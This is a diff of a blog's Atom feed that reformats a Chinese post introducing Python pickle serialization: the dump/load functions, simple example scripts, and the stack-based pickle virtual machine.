@@ -968,80 +968,38 @@ lnk 文件是用于指向其他文件的一种文件。这些文件通常被称�
         <id>https://blog.xcu.icu/2023/03/08/python%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
         <title>python的序列化和反序列化</title>
         <link rel="alternate" href="https://blog.xcu.icu/2023/03/08/python%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
-        <content type="html">&lt;h2 id=&#34;python的序列化和反序列化&#34;&gt;&lt;a href=&#34;#python的序列化和反序列化&#34; class=&#34;headerlink&#34; title=&#34;python的序列化和反序列化&#34;&gt;&lt;/a&gt;python的序列化和反序列化&lt;/h2&gt;&lt;p&gt;​	程序运行的过程中，所有对象都是在内存中操作的，当程序一旦执行完毕，对象占有的内存会被收回，如果我们想重复调用这些对象就需要将这些对象持久化储存到内存中，下次运行的时候直接读取相关数据，我们将对象从内存中变成可以持久化储存的数据的过程称为序列化&lt;/p&gt;
-&lt;h3 id=&#34;可序列化的对象&#34;&gt;&lt;a href=&#34;#可序列化的对象&#34; class=&#34;headerlink&#34; title=&#34;可序列化的对象&#34;&gt;&lt;/a&gt;可序列化的对象&lt;/h3&gt;&lt;ul&gt;
+        <content type="html">&lt;h2 id=&#34;python的序列化和反序列化&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#python的序列化和反序列化&#34;&gt;#&lt;/a&gt; python 的序列化和反序列化&lt;/h2&gt;
+&lt;p&gt;​	程序运行的过程中，所有对象都是在内存中操作的，当程序一旦执行完毕，对象占有的内存会被收回，如果我们想重复调用这些对象就需要将这些对象持久化储存到内存中，下次运行的时候直接读取相关数据，我们将对象从内存中变成可以持久化储存的数据的过程称为序列化&lt;/p&gt;
+&lt;h3 id=&#34;可序列化的对象&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#可序列化的对象&#34;&gt;#&lt;/a&gt; 可序列化的对象&lt;/h3&gt;
+&lt;ul&gt;
 &lt;li&gt;整数、浮点数、复数&lt;/li&gt;
 &lt;li&gt;str、byte、bytearray&lt;/li&gt;
 &lt;li&gt;只包含可封存对象的集合，包括 tuple、list、set 和 dict&lt;/li&gt;
 &lt;li&gt;定义在模块最外层的函数（使用 def 定义，lambda 函数则不可以）&lt;/li&gt;
 &lt;li&gt;定义在模块最外层的内置函数&lt;/li&gt;
 &lt;li&gt;定义在模块最外层的类&lt;/li&gt;
-&lt;li&gt;None、True和False&lt;/li&gt;
+&lt;li&gt;None、True 和 False&lt;/li&gt;
 &lt;/ul&gt;
-&lt;h2 id=&#34;pickle库和函数&#34;&gt;&lt;a href=&#34;#pickle库和函数&#34; class=&#34;headerlink&#34; title=&#34;pickle库和函数&#34;&gt;&lt;/a&gt;pickle库和函数&lt;/h2&gt;&lt;p&gt;pickle是python语言的一个标准模块，实现了基本数据的序列化和反序列化&lt;br&gt;dumps	将对象反序列化为bytes对象&lt;br&gt;dump	将对象反序列化到文件对象，存入文件&lt;/p&gt;
-&lt;p&gt;loads	对bytes对象进行反序列化&lt;br&gt;load	通过对象反序列化，从文件中读取数据&lt;/p&gt;
+&lt;h2 id=&#34;pickle库和函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pickle库和函数&#34;&gt;#&lt;/a&gt; pickle 库和函数&lt;/h2&gt;
+&lt;p&gt;pickle 是 python 语言的一个标准模块，实现了基本数据的序列化和反序列化&lt;br /&gt;
+ dumps	将对象反序列化为 bytes 对象&lt;br /&gt;
+ dump	将对象反序列化到文件对象，存入文件&lt;/p&gt;
+&lt;p&gt;loads	对 bytes 对象进行反序列化&lt;br /&gt;
+ load	通过对象反序列化，从文件中读取数据&lt;/p&gt;
 &lt;p&gt;首先通过几个例子来看一下几个函数的作用&lt;/p&gt;
-&lt;p&gt;dump&amp;#x2F;load&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;bash&#34;&gt;#序列化
-pickle.dump(obj, file, protocol=None,)
-obj表示要进行封装的对象(必填参数）
-file表示obj要写入的文件对象
-以二进制可写模式打开即wb(必填参数）
-#反序列化
-pickle.load(file, *, fix_imports=True, encoding=&amp;quot;ASCII&amp;quot;, errors=&amp;quot;strict&amp;quot;, buffers=None)
-file文件中读取封存后的对象
-以二进制可读模式打开即rb(必填参数)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import pickle
-import pickletools
-import os
-
-class test(object):
-    def __init__(self):
-        self.value1=&amp;#39;abc1&amp;#39;
-        self.value2=&amp;#39;abc2&amp;#39;
-
-x=test()
-file=open(&amp;#39;1.txt&amp;#39;,&amp;#39;wb&amp;#39;)
-y=pickle.dump(x,file)
-print(file)
-file.close()
-file1=open(&amp;#39;1.txt&amp;#39;,&amp;#39;rb&amp;#39;)
-z=pickle.load(file1)
-print(z)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;pre&gt;&lt;code class=&#34;bash&#34;&gt;#序列化
-pickle.dumps(obj, protocol=None,*,fix_imports=True)
-dumps()方法不需要写入文件中，直接返回一个序列化的bytes对象。
-#反序列化
-pickle.loads(bytes_object, *,fix_imports=True, encoding=&amp;quot;ASCII&amp;quot;. errors=&amp;quot;strict&amp;quot;)
-loads()方法是直接从bytes对象中读取序列化的信息，而非从文件中读取。
-&lt;/code&gt;&lt;/pre&gt;
-&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import pickle
-import pickletools
-import os
-
-class test(object):
-    def __init__(self):
-        self.value1=&amp;#39;a&amp;#39;
-        self.value2=&amp;#39;b&amp;#39;
-
-x=test()
-y=pickle.dumps(x)
-print(y)
-z=pickle.loads(y)
-print(z)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220820152155604.png&#34; alt=&#34;image-20220820152155604&#34;&gt;&lt;/p&gt;
-&lt;p&gt;从上面两个例子可以知道python怎么实现序列化和反序列的操作，接下来记录序列化后的字符串是的含义&lt;/p&gt;
-&lt;h2 id=&#34;PVM&#34;&gt;&lt;a href=&#34;#PVM&#34; class=&#34;headerlink&#34; title=&#34;PVM&#34;&gt;&lt;/a&gt;PVM&lt;/h2&gt;&lt;p&gt;Python是一个名为解释器的软件包，解释器是可以让程序运行起来的一套程序，具有独立性，当我们运行一个python程序的时候会执行两个步骤&lt;/p&gt;
+&lt;p&gt;dump/load&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#序列化&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;pickle.dump&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;obj, file, &lt;span class=&#34;token assign-left variable&#34;&gt;protocol&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;None,&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;obj表示要进行封装的对象&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;必填参数）&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;file表示obj要写入的文件对象&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;以二进制可写模式打开即wb&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;必填参数）&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#反序列化&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;pickle.load&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;file, *, &lt;span class=&#34;token assign-left variable&#34;&gt;fix_imports&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;True, &lt;span class=&#34;token assign-left variable&#34;&gt;encoding&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;ASCII&#34;&lt;/span&gt;, &lt;span class=&#34;token assign-left variable&#34;&gt;errors&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;strict&#34;&lt;/span&gt;, &lt;span class=&#34;token assign-left variable&#34;&gt;buffers&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;None&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;file文件中读取封存后的对象&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;以二进制可读模式打开即rb&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;必填参数&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; pickle&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; pickletools&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; os&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;object&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__init__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;value1&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;abc1&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;value2&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;abc2&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;x&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;test&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;1.txt&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;wb&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;y&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;pickle&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dump&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;close&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;file1&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;1.txt&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;rb&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;z&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;pickle&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;load&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;file1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;z&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#序列化&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;pickle.dumps&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;obj, &lt;span class=&#34;token assign-left variable&#34;&gt;protocol&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;None,*,fix_imports&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;True&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;dumps&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;方法不需要写入文件中，直接返回一个序列化的bytes对象。&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#反序列化&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;pickle.loads&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;bytes_object, *,fix_imports&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;True, &lt;span class=&#34;token assign-left variable&#34;&gt;encoding&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;ASCII&#34;&lt;/span&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token assign-left variable&#34;&gt;errors&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;strict&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;loads&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;方法是直接从bytes对象中读取序列化的信息，而非从文件中读取。&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; pickle&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; pickletools&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; os&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;object&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__init__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;value1&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;a&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;value2&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;b&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;x&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;test&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;y&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;pickle&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dumps&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;y&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;z&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;pickle&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;loads&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;y&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;z&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220820152155604.png&#34; alt=&#34;image-20220820152155604&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;从上面两个例子可以知道 python 怎么实现序列化和反序列的操作，接下来记录序列化后的字符串是的含义&lt;/p&gt;
+&lt;h2 id=&#34;pvm&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pvm&#34;&gt;#&lt;/a&gt; PVM&lt;/h2&gt;
+&lt;p&gt;Python 是一个名为解释器的软件包，解释器是可以让程序运行起来的一套程序，具有独立性，当我们运行一个 python 程序的时候会执行两个步骤&lt;/p&gt;
 &lt;ol&gt;
-&lt;li&gt;先将将源码编译成字节码（字节码是python特有的一种表现形式，需要进一步编译才能被机器执行，如果python进程在主机上面有写入权限，那么它会吧程序字节码保存为一个.pyc为扩展名的文件，如果没用则在内存中生成字节码在程序执行结束后被自动抛弃）&lt;/li&gt;
-&lt;li&gt;python程序将编译好的字节码转发到PVM（python虚拟机）中，PVM会循环迭代执行字节码码指令&lt;/li&gt;
+&lt;li&gt;先将将源码编译成字节码（字节码是 python 特有的一种表现形式，需要进一步编译才能被机器执行，如果 python 进程在主机上面有写入权限，那么它会吧程序字节码保存为一个.pyc 为扩展名的文件，如果没用则在内存中生成字节码在程序执行结束后被自动抛弃）&lt;/li&gt;
+&lt;li&gt;python 程序将编译好的字节码转发到 PVM（python 虚拟机）中，PVM 会循环迭代执行字节码码指令&lt;/li&gt;
 &lt;/ol&gt;
 &lt;p&gt;(&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0cxMDExL2FydGljbGUvZGV0YWlscy8xMDI5MDg4ODY=&#34;&gt;https://blog.csdn.net/G1011/article/details/102908886&lt;/span&gt;)&lt;/p&gt;
-&lt;h2 id=&#34;PVM和Pickle的关系&#34;&gt;&lt;a href=&#34;#PVM和Pickle的关系&#34; class=&#34;headerlink&#34; title=&#34;PVM和Pickle的关系&#34;&gt;&lt;/a&gt;PVM和Pickle的关系&lt;/h2&gt;&lt;p&gt;pickle是一门基于栈的编程语言，有不同的编程方式，其本质就是一个轻量级的PVM&lt;/p&gt;
-&lt;p&gt;这个轻量级的PVM由三部分组成及功能：&lt;/p&gt;
+&lt;h2 id=&#34;pvm和pickle的关系&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pvm和pickle的关系&#34;&gt;#&lt;/a&gt; PVM 和 Pickle 的关系&lt;/h2&gt;
+&lt;p&gt;pickle 是一门基于栈的编程语言，有不同的编程方式，其本质就是一个轻量级的 PVM&lt;/p&gt;
+&lt;p&gt;这个轻量级的 PVM 由三部分组成及功能：&lt;/p&gt;
 &lt;p&gt;指令处理器：&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;从数据流中读取操作码和参数，并对其进行解释处理，之时处理器会循环这个过程，不断改变栈区（stack）和标签区（memo）区域的值，知道遇到.结束。这时最终停留在栈顶的值将会被作为反序列化对象返回
 &lt;/code&gt;&lt;/pre&gt;
@@ -1051,7 +1009,8 @@ print(z)
 &lt;p&gt;标签区（memo）：&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;由python的字典（dict）实现，可以看作是数据索引或者标记，为PVM的整个生命周期提供储存功能
 &lt;/code&gt;&lt;/pre&gt;
-&lt;h3 id=&#34;python2&#34;&gt;&lt;a href=&#34;#python2&#34; class=&#34;headerlink&#34; title=&#34;python2&#34;&gt;&lt;/a&gt;python2&lt;/h3&gt;&lt;p&gt;几个比较重要的操作码：&lt;/p&gt;
